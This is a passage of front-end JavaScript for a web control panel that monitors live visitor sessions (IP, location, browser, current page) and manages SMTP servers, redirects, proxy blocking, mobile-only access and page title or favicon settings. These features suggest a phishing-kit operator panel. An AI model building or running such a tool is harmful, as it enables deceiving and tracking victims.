width="100" height="100"/></g></g><g transform="translate(360,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,0) scale(2.8, 2.8)"><g transform="" style="fill: rgb(0, 0, 0);"><g><rect x="15" y="15" style="fill:none;" width="70" height="70"/><path d="M85,0H15H0v15v70v15h15h70h15V85V15V0H85z M85,85H15V15h70V85z"/></g></g></g><g transform="translate(720,0) scale(2.8, 2.8)"><g transform="" style="fill: rgb(0, 0, 0);"><g><rect x="15" y="15" style="fill:none;" width="70" height="70"/><path d="M85,0H15H0v15v70v15h15h70h15V85V15V0H85z M85,85H15V15h70V85z"/></g></g></g><g transform="translate(0,720) scale(2.8, 2.8)"><g transform="" style="fill: rgb(0, 0, 0);"><g><rect x="15" y="15" style="fill:none;" width="70" height="70"/><path d="M85,0H15H0v15v70v15h15h70h15V85V15V0H85z M85,85H15V15h70V85z"/></g></g></g><g transform="translate(80,80) scale(1.2, 1.2)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,80) scale(1.2, 1.2)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,800) scale(1.2, 1.2)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g></g></svg>
    </div>
    </div>
    <div class="p-4 border-t border-secondary-light dark:border-secondary-dark">
      <button id="saveSettings" class="btn-primary w-full">Save Changes</button>
    </div>
  `;


  document.getElementById("deleteInactiveToggle").addEventListener("change", function(event) {
    state.delete_inactive = event.target.checked;
    setCookie("deleteInactiveSessions", state.delete_inactive.toString(), 365);
  });

  document.getElementById("soundEffectsToggle").addEventListener("change", function(event) {
    state.soundEffects = event.target.checked;
    setCookie("soundEffects", state.soundEffects.toString(), 365);
  });

  document.getElementById("hide_routeToggle").addEventListener("change", function(event) {
    state.hide_route = event.target.checked;
    setCookie("hide_route", state.hide_route.toString(), 365);
  });

  document.getElementById("block_proxyToggle").addEventListener("change", function(event) {
    state.block_proxy = event.target.checked;
    setCookie("block_proxy", state.block_proxy.toString(), 365);
  });

  document.getElementById("notiftoggle").addEventListener("change", function(event) {
    state.showNotifications = event.target.checked;
    setCookie("showNotifications", state.showNotifications.toString(), 365);
  });

  document.getElementById("workflow-mode-toggle").addEventListener("change", function(event) {
    state.config.options.workflow_mode = event.target.checked;
    setCookie("workflow_mode", state.config.options.workflow_mode.toString(), 365);
});

  document.getElementById("panel_statusToggle").addEventListener("change", function(event) {
    state.panel_status = event.target.checked;
    setCookie("panel_status", state.panel_status.toString(), 365);
  });
  document.getElementById('redirectURL').addEventListener('change', (e) => {
    const newUrl = e.target.value.trim();
    state.redirectURL = newUrl;
    setCookie("redirectURL", newUrl, 365); 
  });
  document.getElementById('pageTitle').addEventListener('change', (e) => {
    const newTitle = e.target.value.trim();
    state.page_title = newTitle;
    setCookie("page_title", newTitle, 365); 
});

document.getElementById('faviconUrl').addEventListener('change', (e) => {
    const newFaviconUrl = e.target.value.trim();
    state.favicon_url = newFaviconUrl;
    setCookie("favicon_url", newFaviconUrl, 365); 
});
  document.getElementById('inactiveSessionTimeout').addEventListener('change', (e) => {
    const newTimeout = parseInt(e.target.value.trim());
    state.inactiveSessionTimeoutMinutes = newTimeout;
    setCookie("inactiveSessionTimeoutMinutes", newTimeout, 365);
  });

  document.getElementById('proxyCheckApiKey').addEventListener('change', (e) => {
    const newApiKey = e.target.value.trim();
    if (!state.config.options.api_keys) {
        state.config.options.api_keys = {};
    }
    state.config.options.api_keys.proxycheck = newApiKey;
    setCookie("proxyCheckApiKey", newApiKey, 365);
});

document.getElementById('saveSettings').addEventListener('click', () => {
  const redirectUrlInput = document.getElementById('redirectURL');
  const redirectUrl = redirectUrlInput ? redirectUrlInput.value.trim() : state.redirectURL;
  
  const inactiveTimeoutInput = document.getElementById('inactiveSessionTimeout');
  const inactiveTimeout = inactiveTimeoutInput ? parseInt(inactiveTimeoutInput.value.trim()) : state.inactiveSessionTimeoutMinutes;

  const proxyCheckInput = document.getElementById('proxyCheckApiKey');
  const proxyCheckKey = proxyCheckInput ? proxyCheckInput.value.trim() : state.config?.options?.api_keys?.proxycheck;

  // Get Page Title and Favicon URL values
  const pageTitleInput = document.getElementById('pageTitle');
  const pageTitle = pageTitleInput ? pageTitleInput.value.trim() : state.page_title;

  const faviconUrlInput = document.getElementById('faviconUrl');
  const faviconUrl = faviconUrlInput ? faviconUrlInput.value.trim() : state.favicon_url;

  const settingsToSave = {
    redirectURL: redirectUrl,
    showNotifications: state.showNotifications,
    soundEffects: state.soundEffects,
    deleteInactiveSessions: state.delete_inactive.toString(),
    hide_route: state.hide_route,
    block_proxy: state.block_proxy,
    mobile_only: state.mobile_only, 
    panel_status: state.panel_status,
    inactiveSessionTimeoutMinutes: inactiveTimeout,
    workflow_mode: state.workflow_mode,
    page_title: pageTitle,
    favicon_url: faviconUrl,
    api_keys: {
      proxycheck: proxyCheckKey
    }
  };
  socket.emit('save_settings', settingsToSave);
  setCookie("showNotifications", state.showNotifications.toString(), 365);
  setCookie("soundEffects", state.soundEffects.toString(), 365);
  setCookie("redirectURL", redirectUrl, 365);
  setCookie("deleteInactiveSessions", state.delete_inactive.toString(), 365);
  setCookie("hide_route", state.hide_route.toString(), 365);
  setCookie("block_proxy", state.block_proxy.toString(), 365);
  setCookie("mobile_only", state.mobile_only.toString(), 365);
  setCookie("panel_status", state.panel_status.toString(), 365);
  setCookie("inactiveSessionTimeoutMinutes", inactiveTimeout.toString(), 365);
  setCookie("proxyCheckApiKey", proxyCheckKey, 365);
  setCookie("workflow_mode", state.workflow_mode.toString(), 365);
  setCookie("page_title", pageTitle, 365);
  setCookie("favicon_url", faviconUrl, 365);
  state.redirectURL = redirectUrl;
  state.inactiveSessionTimeoutMinutes = inactiveTimeout;
  state.page_title = pageTitle;
  state.favicon_url = faviconUrl;
  if (!state.config.options.api_keys) state.config.options.api_keys = {};
  state.config.options.api_keys.proxycheck = proxyCheckKey;
});
}

  const saveParamButton = document.getElementById('saveparam');
  if (saveParamButton) {
      saveParamButton.addEventListener('click', function() {
      });
  }


function showConfirmDialog(message) {
  return new Promise(resolve => {
    const overlay = document.getElementById('confirmDialog');
    const msgEl = document.getElementById('confirmDialogMessage');
    const yesBtn = document.getElementById('confirmDialogYes');
    const noBtn = document.getElementById('confirmDialogNo');

    msgEl.textContent = message;
    overlay.classList.remove('hidden');
    requestAnimationFrame(() => overlay.classList.add('show'));

    const cleanup = () => {
      overlay.classList.remove('show');
      setTimeout(() => overlay.classList.add('hidden'), 200);
      yesBtn.removeEventListener('click', onYes);
      noBtn.removeEventListener('click', onNo);
    };
    const onYes = () => { cleanup(); resolve(true); };
    const onNo = () => { cleanup(); resolve(false); };

    yesBtn.addEventListener('click', onYes);
    noBtn.addEventListener('click', onNo);
  });
}


function loadSmtpServers() {
  fetch('/api/smtp-servers')
      .then(response => response.json())
      .then(data => {
          if (data.success) {
              const smtpSelect = document.getElementById('emailSmtp');
              
              const currentSelection = smtpSelect.value;
              
              smtpSelect.innerHTML = '';
              
              const defaultOption = document.createElement('option');
              defaultOption.value = '';
              defaultOption.textContent = 'Select SMTP Server';
              defaultOption.disabled = true;
              defaultOption.selected = true;
              smtpSelect.appendChild(defaultOption);
              
              const addOption = document.createElement('option');
              addOption.value = 'add-smtp';
              addOption.textContent = '+ Add SMTP';
              smtpSelect.appendChild(addOption);
              
              data.servers.forEach(server => {
                  const option = document.createElement('option');
                  option.value = server.id;
                  option.textContent = server.name;
                  option.dataset.server = server.server;
                  option.dataset.port = server.port;
                  option.dataset.username = server.username;
                  smtpSelect.appendChild(option);
              });
              
              if (currentSelection && currentSelection !== '') {
                  for (let i = 0; i < smtpSelect.options.length; i++) {
                      if (smtpSelect.options[i].value === currentSelection) {
                          smtpSelect.value = currentSelection;
                          break;
                      }
                  }
              }
          } 
      })
      .catch(error => {
          logErrorToServer(error);
      });
}

document.getElementById('emailSmtp').addEventListener('change', async function(e) {
  const selectedValue = this.value;
  
  if (selectedValue === 'add-smtp') {
    this.selectedIndex = 0;
    this.blur();
    const result = await showSmtpModal('Add SMTP Server', 'Save Configuration');
    if (!result) return;
    const smtpData = {
      server: result.host,
      port: parseInt(result.port),
      username: result.username,
      password: result.password
    };
    
    try {
      const response = await fetch('/api/add-smtp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(smtpData)
      });
      
      const data = await response.json();
      
      if (data.success) {
        showToast('SMTP Server added successfully', 'success');
        
        await loadSmtpServers();
        
        const newServerId = `${result.host}_${result.username}`;
        const smtpSelect = document.getElementById('emailSmtp');
        
        let found = false;
        for (let i = 0; i < smtpSelect.options.length; i++) {
          if (smtpSelect.options[i].value === newServerId) {
            smtpSelect.value = newServerId;
            found = true;
            break;
          }
        }
        
        if (!found) {
          this.selectedIndex = 0;
        }
      } else {
        this.selectedIndex = 0;
      }
    } catch (error) {
      logErrorToServer(error);
      this.selectedIndex = 0;
    }
  }
});



async function handleSmtpAction(e) {
  const selectedValue = smtpDropdown.value;
  
  if (selectedValue === 'add-smtp') {
      if (document.getElementById('smtpModal').classList.contains('show')) {
          return;
      }
      
      const result = await showSmtpModal('Add SMTP Server', 'Save Configuration');
      
      if (!result) return;
      
      const smtpData = {
          server: result.host,
          port: parseInt(result.port),
          username: result.username,
          password: result.password
      };
      
      try {
          const response = await fetch('/api/add-smtp', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(smtpData)
          });
          
          const data = await response.json();
          
          if (data.success) {
              const smtpValue = `${result.host}_${result.username}`;
              const smtpLabel = `${result.username} (${result.host})`;
              
              const newOption = document.createElement('option');
              newOption.value = smtpValue;
              newOption.textContent = smtpLabel;
              newOption.dataset.server = result.host;
              newOption.dataset.port = result.port;
              newOption.dataset.username = result.username;
              
              smtpDropdown.insertBefore(newOption, smtpDropdown.options[0]);
              smtpDropdown.value = smtpValue;
              
              showToast('SMTP Server added successfully', 'success');
              
              loadSmtpServers();
          } else {
              showToast(`Failed to add SMTP server: ${data.message}`, 'error');
          }
      } catch (error) {
          logErrorToServer(error);
          showToast('Failed to add SMTP server due to a network error', 'error');
      }
  }
}

function fileToBase64(file) {
  return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = function(e) {
          resolve(e.target.result);
      };
      reader.onerror = function(error) {
          reject(error);
      };
      reader.readAsDataURL(file);
  });
}


function showSmtpModal(title, submitText) {
  return new Promise(resolve => {
    const dropdowns = document.querySelectorAll('.dropdown');
    
    dropdowns.forEach(dropdown => {
      if (!dropdown.classList.contains('hidden')) {
        dropdown.classList.add('hidden');
        dropdown.dataset.wasOpen = 'true';
      }
    });
    
    const modal = document.getElementById('smtpModal');
    const titleEl = document.getElementById('smtpModalTitle');
    const hostInput = document.getElementById('smtpHost');
    const usernameInput = document.getElementById('smtpUsername');
    const passwordInput = document.getElementById('smtpPassword');
    const portInput = document.getElementById('smtpPort');
    const submitBtn = document.getElementById('smtpModalSubmit');
    const cancelBtn = document.getElementById('smtpModalCancel');

    titleEl.textContent = title || 'Add SMTP Configuration';
    submitBtn.textContent = submitText || 'Add SMTP';
    
    hostInput.value = '';
    usernameInput.value = '';
    passwordInput.value = '';
    portInput.value = '';

    modal.classList.remove('hidden');
    requestAnimationFrame(() => modal.classList.add('show'));

    const cleanup = () => {
      modal.classList.remove('show');
      setTimeout(() => {
        modal.classList.add('hidden');
        dropdowns.forEach(dropdown => {
          if (dropdown.dataset.wasOpen === 'true') {
            dropdown.classList.remove('hidden');
            dropdown.dataset.wasOpen = ''; 
          }
        });
      }, 200);
      
      submitBtn.removeEventListener('click', onSubmit);
      cancelBtn.removeEventListener('click', onCancel);
    };

    const onSubmit = () => {
      if (!hostInput.value.trim() || 
          !usernameInput.value.trim() || 
          !passwordInput.value.trim() || 
          !portInput.value.trim()) {
        return;
      }
      
      const result = {
        host: hostInput.value.trim(),
        username: usernameInput.value.trim(),
        password: passwordInput.value.trim(),
        port: portInput.value.trim()
      };
      
      cleanup();
      resolve(result);
    };

    const onCancel = () => {
      cleanup();
      resolve(null);
    };

    submitBtn.addEventListener('click', onSubmit);
    cancelBtn.addEventListener('click', onCancel);
  });
}


function showInputBoxModal(message, placeholder, buttonText) {
  return new Promise(resolve => {
    const overlay = document.getElementById('inputBoxModal');
    const msgEl = document.getElementById('inputBoxModalMessage');
    const inputEl = document.getElementById('inputBoxModalInput');
    const submitBtn = document.getElementById('inputBoxModalSubmit');
    const cancelBtn = document.getElementById('inputBoxModalCancel');

    msgEl.textContent = message;
    inputEl.placeholder = placeholder;
    submitBtn.textContent = buttonText;

    overlay.classList.remove('hidden');
    requestAnimationFrame(() => overlay.classList.add('show'));

    const cleanup = () => {
      overlay.classList.remove('show');
      setTimeout(() => overlay.classList.add('hidden'), 200);
      submitBtn.removeEventListener('click', onSubmit);
      cancelBtn.removeEventListener('click', onCancel);
    };

    const onSubmit = () => {
      const inputValue = inputEl.value.trim();
      cleanup();
      resolve(inputValue);
    };

    const onCancel = () => {
      cleanup();
      resolve(null);
    };

    submitBtn.addEventListener('click', onSubmit);
    cancelBtn.addEventListener('click', onCancel);
  });
}


document.getElementById('toggleAdminSessions').addEventListener('click', () => {
  showAdmins = !showAdmins;
  const eye = document.getElementById('eyeIcon');
  eye.innerHTML = showAdmins
    ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`
    : `<path d="M17.94 17.94L6.06 6.06"/><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>`;
  filterAdminRows();
});

document.getElementById('phoneButton').addEventListener('click', () => {
  const phoneButton = document.getElementById('phoneButton');
  const svg = phoneButton.querySelector('svg');
  const indicator = document.getElementById('phoneButtonIndicator');
  
  const isCharging = svg.classList.contains('lucide-smartphone-charging');
  
  if (!isCharging) {
    svg.innerHTML = '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12.667 8 10 12h4l-2.667 4"/>';
    svg.classList.add('lucide-smartphone-charging');
    svg.classList.add('lucide-smartphone-charging-icon');
    indicator.classList.remove('hidden');
  } else {
    svg.innerHTML = '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line>';
    svg.classList.remove('lucide-smartphone-charging');
    svg.classList.remove('lucide-smartphone-charging-icon');
    indicator.classList.add('hidden');
  }
  
  socket.emit('toggle_mobile_only');
  
  showToast('Updating mobile-only setting...', 'info');
});

socket.on('mobile_only_response', (response) => {
  if (response.status === 'success') {
    state.mobile_only = response.state;
    
    setCookie("mobile_only", response.state.toString(), 365);
    
    fetchConfiguration()
      .then(config => {
        const currentOptions = config.options || {};
        
        currentOptions.mobile_only = response.state;
        
        socket.emit('save_settings', currentOptions);
        
        showToast('Mobile only mode ' + (response.state ? 'enabled' : 'disabled'), 'success');
      })
      .catch(error => {
        logErrorToServer(error);
        showToast('Error updating settings', 'error');
      });
  } else {
    showToast(`Mobile only toggle failed: ${response.message}`, 'error');
    
    const phoneButton = document.getElementById('phoneButton');
    const svg = phoneButton.querySelector('svg');
    const indicator = document.getElementById('phoneButtonIndicator');
    
    if (state.mobile_only) {
      svg.innerHTML = '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12.667 8 10 12h4l-2.667 4"/>';
      svg.classList.add('lucide-smartphone-charging');
      svg.classList.add('lucide-smartphone-charging-icon');
      indicator.classList.remove('hidden');
    } else {
      svg.innerHTML = '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line>';
      svg.classList.remove('lucide-smartphone-charging');
      svg.classList.remove('lucide-smartphone-charging-icon');
      indicator.classList.add('hidden');
    }
  }
});

socket.on('config_updated', function(data) {
  if (data.section === 'options') {
    if (data.key === 'redirectURL') {
      state.redirectURL = data.value;
      
      const redirectInput = document.getElementById('redirectURL');
      if (redirectInput) {
        redirectInput.value = data.value;
      }
      
      setCookie("redirectURL", data.value, 365);
    }
    
    if (data.key === 'mobile_only') {
      state.mobile_only = data.value === true;
      setCookie("mobile_only", data.value.toString(), 365);
      
      const phoneButton = document.getElementById('phoneButton');
      const svg = phoneButton.querySelector('svg');
      const indicator = document.getElementById('phoneButtonIndicator');
      
      if (data.value === true) {
        svg.innerHTML = '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12.667 8 10 12h4l-2.667 4"/>';
        svg.classList.add('lucide-smartphone-charging');
        svg.classList.add('lucide-smartphone-charging-icon');
        indicator.classList.remove('hidden');
      } else {
        svg.innerHTML = '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line>';
        svg.classList.remove('lucide-smartphone-charging');
        svg.classList.remove('lucide-smartphone-charging-icon');
        indicator.classList.add('hidden');
      }
    }
  }
});

function filterAdminRows() {
  document.querySelectorAll('#sessionsTable tbody tr').forEach(row => {
    const page = row.querySelector('td:nth-child(7) span')?.innerText;
    row.style.display = showAdmins || page !== '/admin' ? '' : 'none';
  });
}

  function getCountryCode(countryCode) {
    let code = countryCode.trim().toUpperCase();
    if (code === 'UK') {
      code = 'GB';
    }
    return code;
  }
  
  function getFlagIcon(countryCode) {
    if (!countryCode || countryCode.trim() === '') {
      return ''; 
    }
    return `<img src="https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png" alt="${countryCode}" class="inline-block" />`;
  }
   sessionsTable.addEventListener('click', function(e) {
    if (e.target.classList.contains('copyable')) {
      const text = e.target.innerText;
      navigator.clipboard.writeText(text).then(() => {
        showToast('Copied to clipboard', 'success');
      });
    }
  });

const cookieName = "toggleCookie";
const nCookie = (name, value, days) => {
  const d = new Date();
  d.setTime(d.getTime() + days * 864e5);
  document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
};
const deleteCookie = name => document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";

document.getElementById("deleteInactiveToggle").addEventListener("change", e => {
  e.target.checked ? nCookie(cookieName, "active", 7) : deleteCookie(cookieName);
  alert("Please refresh the page to see changes.");
});

function createInputGroup(groupData) {
    const container = document.querySelector('#availablePages');
    
    const newGroup = document.createElement('div');
    newGroup.className = 'bg-card rounded-xl overflow-hidden h-fit collapsible-section border-b';
    
    const header = document.createElement('button');
    header.className = 'w-full flex items-center justify-between p-4 bg-card  transition-colors collapsible-header';
    
    const headerContent = `
        <h4 class="text-sm font-medium text-text-light dark:text-text-color">${groupData.title}</h4>
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-text-light/60 dark:text-text-color/60 chevron-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="m6 9 6 6 6-6" />
        </svg>
    `;
    header.innerHTML = headerContent;
    
    const content = document.createElement('div');
    content.className = 'p-4 border-t border-secondary-light dark:border-secondary-dark collapsible-content';
    
    const fieldsContainer = document.createElement('div');
    fieldsContainer.className = 'space-y-4';
    
    groupData.fields.forEach(field => {
        const fieldGroup = document.createElement('div');
        fieldGroup.className = 'space-y-2';
        
        const inputHTML = `
            <div class="flex items-center">
                <input type="${field.type}" 
                       value="${field.value}" 
                       placeholder="${field.placeholder}" 
                       class="w-full p-2 rounded border-s bg-box"
                       ${field.disabled ? 'disabled' : ''}>
                <button class="btn-secondary ml-2 copy-button">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect width="14" height="14" x="5" y="5" rx="2" ry="2"></rect>
                        <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                    </svg>
                </button>
            </div>
        `;
        fieldGroup.innerHTML = inputHTML;
        fieldsContainer.appendChild(fieldGroup);
    });
    
    content.appendChild(fieldsContainer);
    newGroup.appendChild(header);
    newGroup.appendChild(content);
    
    container.appendChild(newGroup);
    
    addCopyHandlers(newGroup);
}

function updateExistingInputs(data) {
    const section = document.querySelector(`#${data.sectionId}`);
    if (section) {
        data.fields.forEach(field => {
            const input = section.querySelector(`#${field.id}`);
            if (input) {
                input.value = field.value;
                input.placeholder = field.placeholder;
                input.type = field.type;
                input.disabled = field.disabled;
            }
        });
    }
}

function addCopyHandlers(container) {
  container.querySelectorAll('.copy-button').forEach(button => {
      button.addEventListener('click', (e) => {
          const input = e.currentTarget.previousElementSibling;
          if (input) {
              navigator.clipboard.writeText(input.value)
                  .then(() => showCopySuccess(e.currentTarget))
                  .catch(err => {
                       showToast('Failed to copy', 'error');
                  });
          }
      });
  });

  container.querySelectorAll('.copyable').forEach(el => {
      el.addEventListener('click', (e) => {
          const clickedEl = e.currentTarget;
          let textToCopy;

          if (clickedEl.classList.contains('browser-os-span')) {
              if (state.selectedSession && state.selectedSession.user_agent) {
                  textToCopy = state.selectedSession.user_agent; 
              } else {
                  textToCopy = "Unknown user agent"; 
              }
          } else {
              textToCopy = clickedEl.textContent.trim();
          }

          if (textToCopy === null || textToCopy === undefined) {
              textToCopy = '';
          }

          navigator.clipboard.writeText(textToCopy)
              .then(() => {
                  showCopySuccess(clickedEl); 
              })
              .catch(err => {
                  showToast('Failed to copy', 'error');
              });
      });
  });
}

function showCopySuccess(button) {
    const originalInnerHTML = button.innerHTML;
    button.innerHTML = `
        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-status-success-light dark:text-status-success-dark" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M20 6 9 17l-5-5"/>
        </svg>
    `;
    setTimeout(() => {
        button.innerHTML = originalInnerHTML;
    }, 2000);
}

document.querySelectorAll('.copy-button').forEach(button => {
    button.addEventListener('click', (e) => {
        const input = e.currentTarget.previousElementSibling;
        navigator.clipboard.writeText(input.value)
            .then(() => showCopySuccess(e.currentTarget))
            .catch(err => console.error('Failed to copy:', err));
    });
});

var sessionActionButtons = {};
var renderAnimationFrame = null;

function ensureTableContainerIsReady() {
  const container = document.querySelector('.sessions-table-container');
  if (!container) {
    const table = document.getElementById('sessionsTable');
    if (table) {
      const wrapper = document.createElement('div');
      wrapper.className = 'sessions-table-container';
      wrapper.style.position = 'relative';
      table.parentNode.insertBefore(wrapper, table);
      wrapper.appendChild(table);
    } else {
      const tables = document.querySelectorAll('table');
      for (const table of tables) {
        if (table.querySelector('thead th') && 
            table.querySelector('thead th').textContent.includes('Session')) {
          const wrapper = document.createElement('div');
          wrapper.className = 'sessions-table-container';
          wrapper.style.position = 'relative';
          table.parentNode.insertBefore(wrapper, table);
          wrapper.appendChild(table);
          break;
        }
      }
    }
  }
  return document.querySelector('.sessions-table-container');
}

function initializeActionButtonOverlay() {
  const container = ensureTableContainerIsReady();
  
  if (!container) {
    setTimeout(initializeActionButtonOverlay, 3000);
    return;
  }
  
  if (!document.getElementById('session-actions-overlay')) {
    const overlay = document.createElement('div');
    overlay.id = 'session-actions-overlay';
    overlay.style.position = 'absolute';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.pointerEvents = 'none';
    overlay.style.zIndex = '10';
    container.style.position = 'relative';
    container.appendChild(overlay);
  }
}

var sessionActionButtons = {};
var sessionDeleteButtons = {}; 
var renderAnimationFrame = null;

function renderSessionsTable() {
  if (typeof renderAnimationFrame !== 'undefined' && renderAnimationFrame) {
    cancelAnimationFrame(renderAnimationFrame);
  }
  
  renderAnimationFrame = requestAnimationFrame(() => {
    const tbody = sessionsTable.querySelector('tbody');
    if (!tbody) {
        return;
    }

    let sessionsToRender = [...state.sessions];
    
    if (!showAdmins) {
      sessionsToRender = sessionsToRender.filter(session => session.current_page !== '/admin');
    }

    sessionsToRender = sessionsToRender.filter(session => session.countryCode !== null && typeof session.countryCode !== 'undefined');

    sessionsToRender.sort((a, b) => {
      const aDisconnected = a.socket_id === null || typeof a.socket_id === 'undefined';
      const bDisconnected = b.socket_id === null || typeof b.socket_id === 'undefined';
      if (aDisconnected && !bDisconnected) return 1;
      if (!aDisconnected && bDisconnected) return -1;
      return 0;
    });

    tbody.innerHTML = sessionsToRender.map(session => {
      const isDisconnected = session.socket_id === null || typeof session.socket_id === 'undefined';
      const rowClass = isDisconnected ? 'session-disconnected' : '';
      const isActive = !isDisconnected && session.isActive;

      
      return `
      <tr data-session-id="${session.id}" class="${rowClass}">
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <span class="font-mono text-xs ${isDisconnected ? '' : 'copyable'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${session.id ? session.id.slice(0, 8) : 'N/A'}...</span>
        </td>
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <span class="font-mono text-xs ${isDisconnected ? '' : 'copyable'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${session.ip || 'N/A'}</span>
        </td>
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <div class="flex items-center gap-1">
            <div style="width:16px;height:16px">${getFlagIcon(getCountryCode(session.countryCode || ''))}</div>
            <span class="text-xs inline-block w-32 text-center ${isDisconnected ? '' : 'copyable'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${session.location || 'N/A'}</span>
          </div>
        </td>
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <div class="flex items-center gap-1">
            ${getBrowserIcon(session.browser || '')}
            ${getOsIcon(session.os || '')}
            <span class="text-xs truncate max-w-[120px] ${isDisconnected ? '' : 'copyable browser-os-span'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${session.browser || 'N/A'} / ${session.os || 'N/A'}</span>
          </div>
        </td>
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <span class="text-xs ${isDisconnected ? '' : 'copyable'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${session.created || 'N/A'}</span>
        </td>
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <div class="flex items-center gap-1">
            ${isDisconnected
              ? `<svg xmlns="http://www.w3.org/2000/svg" class="h-2 w-2" viewBox="0 0 24 24" fill="#888888"><circle cx="12" cy="12" r="10"/></svg>`
              : (isActive
              ? `<svg xmlns="http://www.w3.org/2000/svg" class="h-2 w-2 animate-pulse-slow" viewBox="0 0 24 24" fill="#00ff00"><circle cx="12" cy="12" r="10"/></svg>`
              : `<svg xmlns="http://www.w3.org/2000/svg" class="h-2 w-2" viewBox="0 0 24 24" fill="#ff0000"><circle cx="12" cy="12" r="10"/></svg>`
              )
            }
            <span class="text-xs ${isDisconnected ? '' : 'copyable'}" style="cursor: ${isDisconnected ? 'default' : 'pointer'};">${timeSince(session.last_activity)}</span>
          </div>
        </td>
        ${isDisconnected
          ? `
          <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box text-center">
            <span title="Session disconnected or data missing" class="inline-flex items-center justify-center">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-500"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
            </span>
          </td>
          <td class="action-cell-disconnected px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box text-right">
            <div class="relative flex justify-end disconnected-delete-button-placeholder" data-session-id="${session.id}" style="height: 25px; width: 25px;"></div>
          </td>`
          : `
        <td class="px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <div class="flex items-center">
            <span class="text-xs text-primary-light dark:text-primary-dark hover:underline cursor-pointer truncate max-w-[120px] copyable" style="cursor: pointer;">${session.current_page || 'N/A'}</span>
          </div>
        </td>
        <td class="action-cell px-3 py-2 text-sm text-text-light dark:text-text-color whitespace-nowrap bg-box">
          <div class="relative flex justify-end action-button-placeholder" data-session-id="${session.id}" style="height: 25px;"></div>
        </td>`
        }
      </tr>
    `;
    }).join('');
    
    addCopyHandlers(tbody);
    
    requestAnimationFrame(() => { 
      positionActionButtons(); 
    });
});
}


if (typeof sessionActionButtons !== 'object' || !sessionActionButtons) sessionActionButtons = {};
